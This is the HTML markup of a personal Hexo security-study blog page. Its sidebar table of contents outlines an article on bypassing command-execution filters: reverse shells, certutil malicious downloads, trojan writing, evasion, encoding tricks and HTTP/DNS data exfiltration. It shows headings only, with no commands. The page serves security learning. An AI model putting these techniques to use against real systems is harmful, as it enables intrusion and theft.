title="Hello World"><img class="cover" src="https://img.shetu66.com/2023/08/03/1691035301699647.png" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-07-15</div><div class="info-item-2">Hello World</div></div><div class="info-2"><div class="info-item-1">Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick StartCreate a new post1$ hexo new &quot;My New Post&quot;  More info: Writing Run server1$ hexo server  More info: Server Generate static files1$ hexo generate  More info: Generating Deploy to remote sites1$ hexo deploy  More info: Deployment 相册教程https://blog.csdn.net/weixin_45509582/article/det...</div></div></div></a></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/icon.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">Abernethy</div><div class="author-info-description">「Abernethy」的网络安全研习录</div><div class="site-data"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">15</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">10</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">5</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/Sebastian-AlphaX"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons"><a class="social-icon" href="https://github.com/Sebastian-AlphaX" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a><a class="social-icon" href="mailto:2926295043@qq.com" target="_blank" title="Email"><i class="fas fa-envelope" style="color: #4a7dbe;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>Announcement</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Contents</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-RCE-%E7%BB%95%E8%BF%87%E6%8A%80%E6%9C%AF%E5%85%A8%E9%9D%A2%E6%8C%87%E5%8D%97"><span class="toc-number">1.</span> <span class="toc-text">命令执行(RCE)绕过技术全面指南</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-%E5%9F%BA%E7%A1%80%E6%A6%82%E5%BF%B5"><span class="toc-number">1.1.</span> <span class="toc-text">1.  基础概念</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-%E5%B8%B8%E8%A7%81%E6%89%A7%E8%A1%8C%E5%87%BD%E6%95%B0"><span class="toc-number">1.2.</span> <span class="toc-text">2. 常见执行函数</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#2-1-PHP%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E5%87%BD%E6%95%B0"><span class="toc-number">1.2.1.</span> <span class="toc-text">2.1 PHP代码执行函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-2-PHP%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%87%BD%E6%95%B0"><span class="toc-number">1.2.2.</span> <span class="toc-text">2.2 PHP命令执行函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-3-%E7%89%B9%E6%AE%8A%E5%87%BD%E6%95%B0%E5%88%A9%E7%94%A8"><span class="toc-number">1.2.3.</span> <span class="toc-text">2.3 特殊函数利用</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-%E4%BB%8E%E7%B3%BB%E7%BB%9F%E6%8F%90%E5%8F%96%E6%95%B0%E6%8D%AE"><span class="toc-number">1.3.</span> <span class="toc-text">3. 从系统提取数据</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-%E5%8F%8D%E5%90%91-Shell"><span class="toc-number">1.4.</span> <span class="toc-text">4. 反向 Shell</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#4-1-%E5%9F%BA%E6%9C%AC%E5%8F%8D%E5%90%91"><span class="toc-number">1.4.1.</span> <span class="toc-text">4.1 基本反向</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-2-Linux%E5%8F%8D%E5%BC%B9shell%E7%9A%84%E6%96%B9%E5%BC%8F%E5%AE%9E%E7%8E%B0%E5%90%8E%E6%B8%97%E9%80%8F%E7%9A%84%E5%88%A9%E7%94%A8"><span class="toc-number">1.4.2.</span> <span class="toc-text">4.2 Linux反弹shell的方式实现后渗透的利用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-3-Windows-%E5%8F%8D%E5%BC%B9shell%E5%AE%9E%E7%8E%B0%E5%90%8E%E6%B8%97%E9%80%8F%E5%88%A9%E7%94%A8"><span class="toc-number">1.4.3.</span> <span class="toc-text">4.3 Windows 反弹shell实现后渗透利用</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#4-3-1-Powershell%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="toc-number">1.4.3.1.</span> <span class="toc-text">4.3.1 Powershell命令执行</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#A-%E6%89%A7%E8%A1%8C%E5%8F%82%E6%95%B0%EF%BC%88%E8%A7%84%E9%81%BF%E6%A3%80%E6%B5%8B%E5%92%8C%E9%99%90%E5%88%B6%EF%BC%89%EF%BC%9A"><span class="toc-number">1.4.3.1.0.1.</span> <span class="toc-text">A. 执行参数（规避检测和限制）：</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#B-%E5%8F%8D%E5%90%91Shell%E4%BB%A3%E7%A0%81%EF%BC%88%E6%A0%B8%E5%BF%83%E9%80%BB%E8%BE%91%EF%BC%89%EF%BC%9A"><span class="toc-number">1.4.3.1.0.2.</span> <span class="toc-text">B. 反向Shell代码（核心逻辑）：</span></a></li></ol></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-3-2-certutil%E6%81%B6%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%89%A7%E8%A1%8C"><span class="toc-number">1.4.3.2.</span> <span class="toc-text">4.3.2 certutil恶意文件下载执行</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-3-3-windows%E5%86%99%E5%85%A5%E6%9C%A8%E9%A9%AC"><span class="toc-number">1.4.3.3.</span> <span class="toc-text">4.3.3 windows写入木马</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5-%E5%85%B3%E9%94%AE%E5%AD%97%E8%BF%87%E6%BB%A4%E7%BB%95%E8%BF%87"><span class="toc-number">1.5.</span> <span class="toc-text">5. 关键字过滤绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#5-1-%E5%91%BD%E4%BB%A4%E6%9B%BF%E4%BB%A3"><span class="toc-number">1.5.1.</span> <span class="toc-text">5.1  命令替代</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-2-%E7%AC%A6%E5%8F%B7%E5%B9%B2%E6%89%B0%E7%BB%95%E8%BF%87"><span class="toc-number">1.5.2.</span> <span class="toc-text">5.2 符号干扰绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-3-%E5%8F%98%E9%87%8F%E6%8B%BC%E6%8E%A5%E7%BB%95%E8%BF%87"><span class="toc-number">1.5.3.</span> <span class="toc-text">5.3  变量拼接绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-4-%E7%A9%BA%E5%8F%98%E9%87%8F%E5%B9%B2%E6%89%B0%E7%BB%95%E8%BF%87"><span class="toc-number">1.5.4.</span> <span class="toc-text">5.4  空变量干扰绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-5-%E9%80%9A%E9%85%8D%E7%AC%A6%E7%BB%95%E8%BF%87"><span class="toc-number">1.5.5.</span> <span class="toc-text">5.5  通配符绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-6-%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E6%88%AA%E5%8F%96%E7%BB%95%E8%BF%87"><span class="toc-number">1.5.6.</span> <span class="toc-text">5.6  环境变量截取绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-7-Shell%E7%89%B9%E6%AE%8A%E5%8F%98%E9%87%8F"><span class="toc-number">1.5.7.</span> <span class="toc-text">5.7 Shell特殊变量</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Shell-%E4%B8%AD%E5%B8%B8%E7%94%A8%E7%9A%84%E5%85%AD%E7%A7%8D%E6%95%B0%E5%AD%A6%E8%AE%A1%E7%AE%97%E6%96%B9%E5%BC%8F"><span class="toc-number">1.5.7.1.</span> <span class="toc-text">Shell 中常用的六种数学计算方式</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Shell%E4%BD%8D%E7%BD%AE%E5%8F%82%E6%95%B0%EF%BC%88%E5%91%BD%E4%BB%A4%E8%A1%8C%E5%8F%82%E6%95%B0%EF%BC%89-n"><span class="toc-number">1.5.7.2.</span> <span class="toc-text">Shell位置参数（命令行参数）$n</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Shell%E7%89%B9%E6%AE%8A%E5%8F%98%E9%87%8F%EF%BC%9AShell-%E3%80%81-%E3%80%81-%E3%80%81-%E3%80%81"><span class="toc-number">1.5.7.3.</span> <span class="toc-text">Shell特殊变量：Shell $#、$*、$@、$?、$$</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Shell%E7%89%B9%E6%AE%8A%E5%91%BD%E4%BB%A4-%E5%92%8C"><span class="toc-number">1.5.7.4.</span> <span class="toc-text">Shell特殊命令$- 和 $_</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-8-%E5%86%85%E8%81%94%E6%89%A7%E8%A1%8C%E7%BB%95%E8%BF%87"><span class="toc-number">1.5.8.</span> <span class="toc-text">5.8 内联执行绕过</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#6-%E7%BC%96%E7%A0%81%E7%BB%95%E8%BF%87%E6%8A%80%E6%9C%AF"><span class="toc-number">1.6.</span> <span class="toc-text">6. 编码绕过技术</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#6-1-Base64%E7%BC%96%E7%A0%81"><span class="toc-number">1.6.1.</span> <span class="toc-text">6.1 Base64编码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6-2-Hex%E7%BC%96%E7%A0%81%EF%BC%88ASCII%E7%BC%96%E7%A0%81%EF%BC%89"><span class="toc-number">1.6.2.</span> <span class="toc-text">6.2 Hex编码（ASCII编码）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6-3-%E5%85%AB%E8%BF%9B%E5%88%B6%E7%BC%96%E7%A0%81"><span class="toc-number">1.6.3.</span> <span class="toc-text">6.3  八进制编码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6-4-Unicode%E7%BC%96%E7%A0%81"><span class="toc-number">1.6.4.</span> <span class="toc-text">6.4  Unicode编码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6-5-%E5%8D%81%E5%85%AD%E8%BF%9B%E5%88%B6"><span class="toc-number">1.6.5.</span> <span class="toc-text">6.5 十六进制</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#7-%E7%A9%BA%E6%A0%BC%E8%BF%87%E6%BB%A4%E7%BB%95%E8%BF%87"><span class="toc-number">1.7.</span> <span class="toc-text">7. 空格过滤绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#7-1-%E7%89%B9%E6%AE%8A%E5%8F%98%E9%87%8F%E6%9B%BF%E4%BB%A3"><span class="toc-number">1.7.1.</span> <span class="toc-text">7.1  特殊变量替代</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#7-2-%E9%87%8D%E5%AE%9A%E5%90%91%E7%AC%A6%E5%8F%B7%E6%9B%BF%E4%BB%A3"><span class="toc-number">1.7.2.</span> <span class="toc-text">7.2  重定向符号替代</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#7-3-%E5%A4%A7%E6%8B%AC%E5%8F%B7%E6%9B%BF%E4%BB%A3"><span class="toc-number">1.7.3.</span> <span class="toc-text">7.3 大括号替代</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#7-4-URL%E7%BC%96%E7%A0%81%E6%9B%BF%E4%BB%A3"><span class="toc-number">1.7.4.</span> <span class="toc-text">7.4 URL编码替代</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#7-5-%E5%85%B6%E4%BB%96%E7%89%B9%E6%AE%8A%E5%BD%A2%E5%BC%8F"><span class="toc-number">1.7.5.</span> <span class="toc-text">7.5 其他特殊形式</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#8-%E5%88%86%E9%9A%94%E7%AC%A6%E8%BF%87%E6%BB%A4%E7%BB%95%E8%BF%87"><span class="toc-number">1.8.</span> <span class="toc-text">8.  分隔符过滤绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#8-1-%E5%B8%B8%E7%94%A8%E5%88%86%E9%9A%94%E7%AC%A6"><span class="toc-number">1.8.1.</span> <span class="toc-text">8.1 常用分隔符</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#8-2-%E6%8D%A2%E8%A1%8C%E7%AC%A6%E5%92%8C%E5%9B%9E%E8%BD%A6%E7%AC%A6"><span class="toc-number">1.8.2.</span> <span class="toc-text">8.2  换行符和回车符</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#8-3-PHP%E7%89%B9%E5%AE%9A%E7%BB%95%E8%BF%87"><span class="toc-number">1.8.3.</span> <span class="toc-text">8.3  PHP特定绕过</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#9-%E6%97%A0%E5%9B%9E%E6%98%BE%E5%A4%84%E7%90%86%E6%8A%80%E5%B7%A7"><span class="toc-number">1.9.</span> <span class="toc-text">9. 无回显处理技巧</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#9-1-%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8"><span class="toc-number">1.9.1.</span> <span class="toc-text">9.1 时间盲注</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#9-2-HTTP%E5%A4%96%E5%B8%A6%E6%95%B0%E6%8D%AE"><span class="toc-number">1.9.2.</span> <span class="toc-text">9.2  HTTP外带数据</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#9-3-DNS%E5%A4%96%E5%B8%A6%E6%95%B0%E6%8D%AE"><span class="toc-number">1.9.3.</span> <span class="toc-text">9.3 DNS外带数据</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#9-4-%E5%86%99%E5%85%A5%E6%96%87%E4%BB%B6%E5%90%8E%E8%AE%BF%E9%97%AE"><span class="toc-number">1.9.4.</span> <span class="toc-text">9.4 写入文件后访问</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#10-%E9%95%BF%E5%BA%A6%E9%99%90%E5%88%B6%E7%BB%95%E8%BF%87"><span class="toc-number">1.10.</span> <span class="toc-text">10. 长度限制绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#10-1-%E7%9F%AD%E5%91%BD%E4%BB%A4%E7%94%9F%E6%88%90"><span class="toc-number">1.10.1.</span> <span class="toc-text">10.1 短命令生成</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#10-2-%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E6%89%A9%E5%B1%95"><span class="toc-number">1.10.2.</span> <span class="toc-text">10.2  环境变量扩展</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#10-3-%E9%80%9A%E8%BF%87%E6%8D%A2%E8%A1%8C%E8%BF%9E%E6%8E%A5"><span class="toc-number">1.10.3.</span> <span class="toc-text">10.3  通过换行连接</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#11-%E6%97%A0%E5%8F%82%E6%95%B0RCE%E7%BB%95%E8%BF%87"><span class="toc-number">1.11.</span> <span class="toc-text">11. 无参数RCE绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#11-1-%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E8%AF%BB%E5%8F%96"><span class="toc-number">1.11.1.</span> <span class="toc-text">11.1 目录遍历读取</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#11-2-Session-ID%E5%88%A9%E7%94%A8"><span class="toc-number">1.11.2.</span> <span class="toc-text">11.2 Session ID利用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#11-3-HTTP%E5%A4%B4%E5%88%A9%E7%94%A8"><span class="toc-number">1.11.3.</span> <span class="toc-text">11.3  HTTP头利用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#11-4-%E5%85%A8%E5%B1%80%E5%8F%98%E9%87%8F%E5%88%A9%E7%94%A8"><span class="toc-number">1.11.4.</span> <span class="toc-text">11.4  全局变量利用</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#12-%E6%97%A0%E5%AD%97%E6%AF%8D%E6%95%B0%E5%AD%97%E7%BB%95%E8%BF%87"><span class="toc-number">1.12.</span> <span class="toc-text">12. 无字母数字绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#12-1-%E5%BC%82%E6%88%96%E8%BF%90%E7%AE%97%E7%BB%95%E8%BF%87"><span class="toc-number">1.12.1.</span> <span class="toc-text">12.1  异或运算绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#12-2-%E6%88%96%E8%BF%90%E7%AE%97%E7%BB%95%E8%BF%87"><span class="toc-number">1.12.2.</span> <span class="toc-text">12.2 或运算绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9E%84%E9%80%A0%E8%84%9A%E6%9C%AC"><span class="toc-number">1.12.2.1.</span> <span class="toc-text">构造脚本</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#12-3-URL-%E7%BC%96%E7%A0%81%E5%8F%96%E5%8F%8D%E7%BB%95%E8%BF%87"><span class="toc-number">1.12.3.</span> <span class="toc-text">12.3 URL 编码取反绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#12-4-%E8%87%AA%E5%A2%9E%E6%9E%84%E9%80%A0%E5%AD%97%E7%AC%A6"><span class="toc-number">1.12.4.</span> <span class="toc-text">12.4  自增构造字符</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#13-%E5%8D%8F%E8%AE%AE%E5%88%A9%E7%94%A8%E7%BB%95%E8%BF%87"><span class="toc-number">1.13.</span> <span class="toc-text">13. 协议利用绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#13-1-%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E5%8D%8F%E8%AE%AE"><span class="toc-number">1.13.1.</span> <span class="toc-text">13.1  文件读取协议</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#13-2-%E6%95%B0%E6%8D%AE%E8%BE%93%E5%85%A5%E5%8D%8F%E8%AE%AE"><span class="toc-number">1.13.2.</span> <span class="toc-text">13.2 数据输入协议</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#13-3-%E5%8E%8B%E7%BC%A9%E5%8C%85%E5%8D%8F%E8%AE%AE"><span class="toc-number">1.13.3.</span> <span class="toc-text">13.3 压缩包协议</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#14-%E7%89%B9%E6%AE%8A%E7%BB%95%E8%BF%87%E6%8A%80%E6%9C%AF"><span class="toc-number">1.14.</span> <span class="toc-text">14. 特殊绕过技术</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#14-1-LD-PRELOAD%E7%BB%95%E8%BF%87"><span class="toc-number">1.14.1.</span> <span class="toc-text">14.1  LD_PRELOAD绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#14-2-Shellshock%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2014-6271%EF%BC%89%E7%BB%95%E8%BF%87"><span class="toc-number">1.14.2.</span> <span class="toc-text">14.2 Shellshock漏洞（CVE-2014-6271）绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#14-3-Apache-Mod-CGI%E7%BB%95%E8%BF%87"><span class="toc-number">1.14.3.</span> <span class="toc-text">14.3 Apache Mod CGI绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#14-4-dev-null-2-1%E7%B1%BB%E6%97%A0%E5%9B%9E%E6%98%BE"><span class="toc-number">1.14.4.</span> <span class="toc-text">14.4 &gt;&#x2F;dev&#x2F;null 2&gt;&amp;1类无回显</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Reference"><span class="toc-number">1.15.</span> <span class="toc-text">Reference</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Posts</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2025/09/22/N1CTF/N1CTF/" title="Untitled"><img src="https://img.shetu66.com/2023/08/03/1691035301699647.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Untitled"/></a><div class="content"><a class="title" href="/2025/09/22/N1CTF/N1CTF/" title="Untitled">Untitled</a><time datetime="2025-09-22T04:53:47.881Z" title="Created 2025-09-22 12:53:47">2025-09-22</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/09/22/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%BB%95%E8%BF%87/" title="命令执行(RCE)绕过技术"><img src="https://blog-abc.oss-cn-beijing.aliyuncs.com/image/1757651700281.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="命令执行(RCE)绕过技术"/></a><div class="content"><a class="title" href="/2025/09/22/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%BB%95%E8%BF%87/" title="命令执行(RCE)绕过技术">命令执行(RCE)绕过技术</a><time datetime="2025-09-21T16:36:47.252Z" title="Created 2025-09-22 00:36:47">2025-09-22</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/09/22/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E2%80%94%E2%80%94%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95/" title="PHP反序列化——魔术方法"><img src="https://blog-abc.oss-cn-beijing.aliyuncs.com/image/1758515720098.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="PHP反序列化——魔术方法"/></a><div class="content"><a class="title" href="/2025/09/22/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E2%80%94%E2%80%94%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95/" title="PHP反序列化——魔术方法">PHP反序列化——魔术方法</a><time datetime="2025-09-21T16:24:00.575Z" title="Created 2025-09-22 00:24:00">2025-09-22</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/09/22/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E2%80%94%E2%80%94%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%80%83%E9%80%B8/" title="PHP反序列化——字符串逃逸"><img src="https://blog-abc.oss-cn-beijing.aliyuncs.com/image/1758515720098.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="PHP反序列化——字符串逃逸"/></a><div class="content"><a class="title" href="/2025/09/22/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E2%80%94%E2%80%94%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%80%83%E9%80%B8/" title="PHP反序列化——字符串逃逸">PHP反序列化——字符串逃逸</a><time datetime="2025-09-21T16:23:44.152Z" title="Created 2025-09-22 00:23:44">2025-09-22</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/09/22/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E2%80%94%E2%80%94%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96POP/" title="PHP反序列化——反序列化POP"><img src="https://blog-abc.oss-cn-beijing.aliyuncs.com/image/1758515720098.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="PHP反序列化——反序列化POP"/></a><div class="content"><a class="title" href="/2025/09/22/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E2%80%94%E2%80%94%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96POP/" title="PHP反序列化——反序列化POP">PHP反序列化——反序列化POP</a><time datetime="2025-09-21T16:23:28.021Z" title="Created 2025-09-22 00:23:28">2025-09-22</time></div></div></div></div></div></div></main><footer id="footer"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;2025 By Abernethy</span><span class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 7.3.0</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.4.2</a></span></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Reading Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Toggle Between Light and Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle Between Single-column and Double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="Settings"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back to Top"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"></div><script defer="defer" id="fluttering_ribbon" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/canvas-fluttering-ribbon.min.js"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>